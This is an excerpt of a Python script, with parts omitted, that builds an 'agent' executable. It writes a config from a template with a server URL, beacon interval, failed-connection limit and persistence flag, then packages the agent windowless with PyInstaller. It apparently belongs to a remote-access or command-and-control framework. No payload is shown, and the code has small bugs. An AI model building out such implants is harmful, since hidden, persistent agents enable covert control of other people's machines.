...
def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
    ...
    agent_dir = os.path.dirname(__file__) + os.path.basename(__file__) 
    #agent_dir = os.path.dirname(__file__)
    print (agent_dir)

    with open("config.py", 'w') as agent_config:



        
        with open("template_config.py") as f:
            config_file = f.read()
    ...
    print("Executable name is {}".format(output))
    
    try:

        if platform == 'linux':
            os.system('pyinstaller --noconsole --onefile ' + output + '.py')
            
        elif platform == 'windows':
            os.system('pyinstaller --noconsole --onefile ' + output + '.py')
        
        print ("[+] Agent built successfully: {}".format(output))
    except :
        print ("[-] Can't compile Agent successfully ")
...
if __name__ == "__main__":
    main()
#build_agent(output="file", server_url="http://localhost:8080", platform="windows", hello_interval=3, idle_time=1, max_failed_connections=10, persist=True)